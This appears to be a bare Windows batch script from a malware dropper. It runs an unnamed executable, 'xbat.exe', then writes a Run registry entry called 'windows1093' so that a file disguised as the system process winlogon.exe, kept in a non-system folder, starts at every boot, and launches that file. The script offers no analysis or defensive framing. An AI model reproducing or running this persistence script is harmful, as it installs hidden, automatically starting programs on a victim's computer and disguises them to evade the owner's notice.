@echo off
call xbat.exe
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v windows1093 /t reg_sz /d C:\windows1093\winlogon.exe
cd C:\windows1093
start winlogon.exe
